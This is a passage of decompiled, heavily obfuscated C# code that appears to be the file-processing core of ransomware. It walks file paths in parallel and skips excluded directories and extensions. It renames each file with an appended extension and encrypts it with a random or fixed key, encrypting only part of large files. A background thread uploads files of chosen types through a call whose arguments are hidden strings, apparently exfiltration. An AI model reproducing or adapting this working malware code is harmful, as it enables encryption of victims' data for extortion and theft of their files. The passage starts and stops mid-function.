					if (!CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367759)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367766)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367733)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107367684)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107367703)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367678)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367625)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107367640)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107367595)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107367558)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107367581)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107368044)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107368050)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107368029)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367972)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367987)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367938)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367953)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367904)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367887)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367902)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367853)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367840)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367819)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107367838)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107367825)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107367264)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107367247)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(IOVuiCuRiaYQ(TajjcMGKxy.getString_0(107367262))) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367205)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367224)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367175)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.EndsWith(CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.EndsWith(TajjcMGKxy.getString_0(107367150)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.EndsWith(TajjcMGKxy.getString_0(107367145)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.EndsWith(TajjcMGKxy.getString_0(107367140)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.EndsWith(TajjcMGKxy.getString_0(107367167)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367162)) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(wKJjmTiGCFwzP) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(TVaVFXxrZtbC) && !CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(MBSkjCFQIZSn))
					{
						if (CS_0024_003C_003E8__locals0.xZtVzlbLhvULOy.Length != 0)
						{
							string[] xZtVzlbLhvULOy2 = CS_0024_003C_003E8__locals0.xZtVzlbLhvULOy;
							int num2 = 0;
							while (num2 < xZtVzlbLhvULOy2.Length)
							{
								string value2 = xZtVzlbLhvULOy2[num2];
								if (!CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_0e06;
							}
						}
						try
						{
							if (CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.EndsWith(CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO))
							{
								goto IL_0e06;
							}
						}
						catch (Exception)
						{
							goto IL_0e06;
						}
						if (CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.EndsWith(string_0) && !ojqyMmFKXxQzx.Contains(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ))
						{
							if (REuQhDHRFMt == TajjcMGKxy.getString_0(107396965))
							{
								try
								{
									if (sdnUYDgvtpPnO.KcNiwSfGbe(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ))
									{
										sdnUYDgvtpPnO.nVpvygjXPyvs(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ);
									}
								}
								catch
								{
								}
							}
							ojqyMmFKXxQzx.Add(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ);
							Thread thread3 = new Thread((ThreadStart)delegate
							{
								try
								{
									if (IgsTsyCAVSNbiX)
									{
										Console.WriteLine(TajjcMGKxy.BtfkVxbqHeqSpB.getString_0(107446929) + CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + TajjcMGKxy.BtfkVxbqHeqSpB.getString_0(107446936) + new FileInfo(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ).Length + TajjcMGKxy.BtfkVxbqHeqSpB.getString_0(107447395));
										Console.WriteLine(TajjcMGKxy.BtfkVxbqHeqSpB.getString_0(107447418), ojqyMmFKXxQzx.Count, LHsTakbnvLMZqfZlb, opDJfdSoJwBgd);
										Console.WriteLine(TajjcMGKxy.BtfkVxbqHeqSpB.getString_0(107447361), wuIBqNhSkYrbJgK.Elapsed);
										Console.WriteLine(TajjcMGKxy.BtfkVxbqHeqSpB.getString_0(107447304));
									}
								}
								catch
								{
								}
							});
							thread3.Priority = ThreadPriority.Normal;
							thread3.IsBackground = true;
							thread3.Start();
							if (!JGpmykxMfw.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ)))
							{
								JGpmykxMfw.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ));
							}
							tFEmdOUcYrNKNamK(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ);
							try
							{
								try
								{
									if (new FileInfo(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ).Length != 0L)
									{
										goto end_IL_06b4;
									}
									goto end_IL_06b4_2;
									end_IL_06b4:;
								}
								catch (Exception ex12)
								{
									if (fKNptYRWsQNeZX)
									{
										try
										{
											File.AppendAllText(TVaVFXxrZtbC, TajjcMGKxy.getString_0(107365518) + CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + TajjcMGKxy.getString_0(107447052) + ex12.Message + TajjcMGKxy.getString_0(107396671));
										}
										catch (Exception)
										{
										}
									}
									opDJfdSoJwBgd++;
									goto end_IL_06b4_2;
								}
								if (KfMEqDPrRPT == TajjcMGKxy.getString_0(107396965) && new FileInfo(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ).Length > Convert.ToInt32(VwOPUhcZlsvZmR) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.CSkUagcVHnsgV.Contains(string_0))
								{
									CS_0024_003C_003E8__locals0 = new TajjcMGKxy.QhMbbUbrJFUr();
									CS_0024_003C_003E8__locals0.wMoWlOexFmCX = CS_0024_003C_003E8__locals1;
									CS_0024_003C_003E8__locals0.qFRqtpZnzrSL = CS_0024_003C_003E8__locals0;
									try
									{
										if (CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO != TajjcMGKxy.getString_0(107365820))
										{
											if (pWNBRDgBMEak)
											{
												CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO = ACFERZKTAMdtw + CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO;
											}
											File.Move(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO);
										}
									}
									catch (Exception ex14)
									{
										if (fKNptYRWsQNeZX)
										{
											try
											{
												File.AppendAllText(TVaVFXxrZtbC, TajjcMGKxy.getString_0(107365518) + CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + TajjcMGKxy.getString_0(107446991) + ex14.Message + TajjcMGKxy.getString_0(107396671));
											}
											catch (Exception)
											{
											}
										}
										opDJfdSoJwBgd++;
										goto end_IL_06b4_2;
									}
									CS_0024_003C_003E8__locals0.NMewwjhrbwMa = TajjcMGKxy.getString_0(107368307);
									if (CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO != TajjcMGKxy.getString_0(107365820))
									{
										CS_0024_003C_003E8__locals0.NMewwjhrbwMa = CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO;
									}
									else
									{
										CS_0024_003C_003E8__locals0.NMewwjhrbwMa = CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ;
									}
									if (UyFfCzWWLzNEG == TajjcMGKxy.getString_0(107396965))
									{
										Thread thread4 = new Thread((ThreadStart)delegate
										{
											foreach (string item in PlfqlzQrkBHY)
											{
												if (CS_0024_003C_003E8__locals0.NMewwjhrbwMa.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.qFRqtpZnzrSL.MYWMPxbgtmbfTdO) && rLaVjFwRdfLdr == TajjcMGKxy.QhMbbUbrJFUr.getString_0(107396972))
												{
													if (Convert.ToInt32(KOFrqFvMUqLVa) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.NMewwjhrbwMa).Length)
													{
														try
														{
															FZYQuTJPlcz.FdLmtwIxPaLAh(TajjcMGKxy.QhMbbUbrJFUr.getString_0(107368875), TajjcMGKxy.QhMbbUbrJFUr.getString_0(107368902), TajjcMGKxy.QhMbbUbrJFUr.getString_0(107368889), CS_0024_003C_003E8__locals0.NMewwjhrbwMa);
														}
														catch
														{
														}
													}
												}
												else if (CS_0024_003C_003E8__locals0.NMewwjhrbwMa.ToLower().EndsWith(item) && rLaVjFwRdfLdr == TajjcMGKxy.QhMbbUbrJFUr.getString_0(107396282))
												{
													try
													{
														FZYQuTJPlcz.FdLmtwIxPaLAh(TajjcMGKxy.QhMbbUbrJFUr.getString_0(107368875), TajjcMGKxy.QhMbbUbrJFUr.getString_0(107368902), TajjcMGKxy.QhMbbUbrJFUr.getString_0(107368889), CS_0024_003C_003E8__locals0.NMewwjhrbwMa);
													}
													catch
													{
													}
												}
											}
										});
										thread4.Priority = ThreadPriority.Normal;
										thread4.IsBackground = false;
										thread4.Start();
									}
									string text3 = ZCphZGDWjyA.BFOtjpRBWToz(32);
									string s3 = nLZNnVxqRyDU.rfAqHmOOmjC(text3);
									byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
									if (RPSmcrMfZxWv == TajjcMGKxy.getString_0(107396275))
									{
										byte[] array2 = null;
										byte[] byte_2 = GWOsLqMwIb.WvcDKTbtliDrPF(CS_0024_003C_003E8__locals0.NMewwjhrbwMa, Convert.ToInt32(VwOPUhcZlsvZmR) * 1024 * 1024);
										GWOsLqMwIb.isjSvDiECOPp(PwpxQaHWCtbm: (!geKzJTCQWBdPJrv) ? (jHNjZakAkEHPd ? GWOsLqMwIb.buNDQCFBoGJ(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : GWOsLqMwIb.buNDQCFBoGJ(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.UMxsSKxdLwMPg), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (jHNjZakAkEHPd ? COuKIqToBmSj.ECpnJyWrmVTmlfT(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : COuKIqToBmSj.ECpnJyWrmVTmlfT(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.UMxsSKxdLwMPg), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), PFFKOkRvQq: CS_0024_003C_003E8__locals0.NMewwjhrbwMa, lsppjlmhfssIIIt: bytes3);
									}
									else if (!jHNjZakAkEHPd)
									{
										mVRsbcFAguJ.CbqbKQtEvSwyzLYaKI(CS_0024_003C_003E8__locals0.NMewwjhrbwMa, VwOPUhcZlsvZmR, CS_0024_003C_003E8__locals0.UMxsSKxdLwMPg);
									}
									else
									{
										mVRsbcFAguJ.CbqbKQtEvSwyzLYaKI(CS_0024_003C_003E8__locals0.NMewwjhrbwMa, VwOPUhcZlsvZmR, text3, bytes3);
									}
								}
								else
								{
									if (pWNBRDgBMEak)
									{
										CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO = ACFERZKTAMdtw + CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO;
									}
									string text4 = ZCphZGDWjyA.BFOtjpRBWToz(32);
									string s4 = nLZNnVxqRyDU.rfAqHmOOmjC(text4);
									byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
									if (CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO != TajjcMGKxy.getString_0(107365820))
									{
										if (!ZKpCkvvrIixyBkk)
										{
											if (!jHNjZakAkEHPd)
											{
												VLyxmOuvtqcVDJmc(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO, IWnUVTiJnjexACCr);
											}
											else
											{
												VLyxmOuvtqcVDJmc(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO, Encoding.ASCII.GetBytes(text4));
											}
										}
										else
										{
											try
											{
												if (!jHNjZakAkEHPd)
												{
													HQqsRTFrfF(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO, IWnUVTiJnjexACCr);
												}
												else
												{
													HQqsRTFrfF(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO, Encoding.ASCII.GetBytes(text4));
												}
											}
											catch (Exception ex16)
											{
												if (fKNptYRWsQNeZX)
												{
													try
													{
														File.AppendAllText(TVaVFXxrZtbC, TajjcMGKxy.getString_0(107365518) + CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + TajjcMGKxy.getString_0(107365774) + ex16.Message + TajjcMGKxy.getString_0(107396671));
													}
													catch (Exception)
													{
													}
												}
												opDJfdSoJwBgd++;
												goto end_IL_06b4_2;
											}
										}
									}
									else if (!ZKpCkvvrIixyBkk)
									{
										if (!jHNjZakAkEHPd)
										{
											VLyxmOuvtqcVDJmc(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + TajjcMGKxy.getString_0(107365815), IWnUVTiJnjexACCr);
										}
										else
										{
											VLyxmOuvtqcVDJmc(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + TajjcMGKxy.getString_0(107365815), Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!jHNjZakAkEHPd)
											{
												HQqsRTFrfF(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, IWnUVTiJnjexACCr);
											}
											else
											{
												HQqsRTFrfF(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex18)
										{
											if (fKNptYRWsQNeZX)
											{
												try
												{
													File.AppendAllText(TVaVFXxrZtbC, TajjcMGKxy.getString_0(107365518) + CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + TajjcMGKxy.getString_0(107365774) + ex18.Message + TajjcMGKxy.getString_0(107396671));
												}
												catch (Exception)
												{
												}
											}
											opDJfdSoJwBgd++;
											goto end_IL_06b4_2;
										}
									}
									if (jHNjZakAkEHPd)
									{
										if (CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO != TajjcMGKxy.getString_0(107365820))
										{
											ZBrwuJMytAla(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO, bytes4);
										}
										else
										{
											ZBrwuJMytAla(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, bytes4);
										}
									}
								}
								goto IL_0e06;
								end_IL_06b4_2:;
							}
							catch (Exception)
							{
								goto IL_0e06;
							}
						}
					}
					continue;
					IL_0e06:
					CS_0024_003C_003E8__locals0.sqQpQQcELGqIJWzCd.Remove(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.sqQpQQcELGqIJWzCd, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new TajjcMGKxy.UjdWIsKCvIWmr();
			CS_0024_003C_003E8__locals0.qFRqtpZnzrSL = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ = string_0;
			if (!CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367759)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367766)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367733)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107367684)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107367703)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367678)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367625)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107367640)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107367595)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107367558)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107367581)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107368044)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107368050)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107368029)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367972)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367987)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367938)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367953)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367904)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367887)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367902)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367853)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367840)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367819)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107367838)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107367825)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107367264)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(TajjcMGKxy.getString_0(107367247)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(IOVuiCuRiaYQ(TajjcMGKxy.getString_0(107367262))) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367205)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367224)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367175)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.EndsWith(CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.EndsWith(TajjcMGKxy.getString_0(107367150)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.EndsWith(TajjcMGKxy.getString_0(107367145)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.EndsWith(TajjcMGKxy.getString_0(107367140)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.EndsWith(TajjcMGKxy.getString_0(107367167)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(TajjcMGKxy.getString_0(107367162)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(wKJjmTiGCFwzP) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(TVaVFXxrZtbC) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(MBSkjCFQIZSn))
			{
				if (CS_0024_003C_003E8__locals0.xZtVzlbLhvULOy.Length != 0)
				{
					string[] xZtVzlbLhvULOy = CS_0024_003C_003E8__locals0.xZtVzlbLhvULOy;
					int num = 0;
					while (num < xZtVzlbLhvULOy.Length)
					{
						string value = xZtVzlbLhvULOy[num];
						if (!CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0d81;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.EndsWith(CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO))
					{
						goto IL_0d81;
					}
				}
				catch (Exception)
				{
					goto IL_0d81;
				}
				if (!ojqyMmFKXxQzx.Contains(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ))
				{
					if (REuQhDHRFMt == TajjcMGKxy.getString_0(107396965))
					{
						try
						{
							if (sdnUYDgvtpPnO.KcNiwSfGbe(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ))
							{
								sdnUYDgvtpPnO.nVpvygjXPyvs(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ);
							}
						}
						catch
						{
						}
					}
					ojqyMmFKXxQzx.Add(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ);
					Thread thread = new Thread((ThreadStart)delegate
					{
						try
						{
							if (IgsTsyCAVSNbiX)
							{
								Console.WriteLine(TajjcMGKxy.UjdWIsKCvIWmr.getString_0(107446936) + CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + TajjcMGKxy.UjdWIsKCvIWmr.getString_0(107446943) + new FileInfo(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ).Length + TajjcMGKxy.UjdWIsKCvIWmr.getString_0(107447402));
								Console.WriteLine(TajjcMGKxy.UjdWIsKCvIWmr.getString_0(107447425), ojqyMmFKXxQzx.Count, LHsTakbnvLMZqfZlb, opDJfdSoJwBgd);
								Console.WriteLine(TajjcMGKxy.UjdWIsKCvIWmr.getString_0(107447368), wuIBqNhSkYrbJgK.Elapsed);
								Console.WriteLine(TajjcMGKxy.UjdWIsKCvIWmr.getString_0(107447311));
							}
						}
						catch
						{
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (!JGpmykxMfw.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ)))
					{
						JGpmykxMfw.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ));
					}
					tFEmdOUcYrNKNamK(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ);
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ).Length != 0L)
							{
								goto end_IL_0681;
							}
							goto end_IL_0681_2;
							end_IL_0681:;
						}
						catch (Exception ex2)
						{
							if (fKNptYRWsQNeZX)
							{
								try
								{
									File.AppendAllText(TVaVFXxrZtbC, TajjcMGKxy.getString_0(107365518) + CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + TajjcMGKxy.getString_0(107447052) + ex2.Message + TajjcMGKxy.getString_0(107396671));
								}
								catch (Exception)
								{
								}
							}
							opDJfdSoJwBgd++;
							goto end_IL_0681_2;
						}
						if (KfMEqDPrRPT == TajjcMGKxy.getString_0(107396965) && new FileInfo(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ).Length > Convert.ToInt32(VwOPUhcZlsvZmR) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO != TajjcMGKxy.getString_0(107365820))
								{
									if (pWNBRDgBMEak)
									{
										CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO = ACFERZKTAMdtw + CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO;
									}
									File.Move(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO);
								}
							}
							catch (Exception ex4)
							{
								if (fKNptYRWsQNeZX)
								{
									try
									{
										File.AppendAllText(TVaVFXxrZtbC, TajjcMGKxy.getString_0(107365518) + CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + TajjcMGKxy.getString_0(107446991) + ex4.Message + TajjcMGKxy.getString_0(107396671));
									}
									catch (Exception)
									{
									}
								}
								opDJfdSoJwBgd++;
								return;
							}
							if (CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO != TajjcMGKxy.getString_0(107365820))
							{
								CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ += CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO;
							}
							if (UyFfCzWWLzNEG == TajjcMGKxy.getString_0(107396965))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in PlfqlzQrkBHY)
									{
										if (CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.qFRqtpZnzrSL.MYWMPxbgtmbfTdO) && rLaVjFwRdfLdr == TajjcMGKxy.UjdWIsKCvIWmr.getString_0(107396975))
										{
											if (Convert.ToInt32(KOFrqFvMUqLVa) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ).Length)
											{
												try
												{
													FZYQuTJPlcz.FdLmtwIxPaLAh(TajjcMGKxy.UjdWIsKCvIWmr.getString_0(107368878), TajjcMGKxy.UjdWIsKCvIWmr.getString_0(107368905), TajjcMGKxy.UjdWIsKCvIWmr.getString_0(107368892), CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ);
												}
												catch
												{
												}
											}
										}
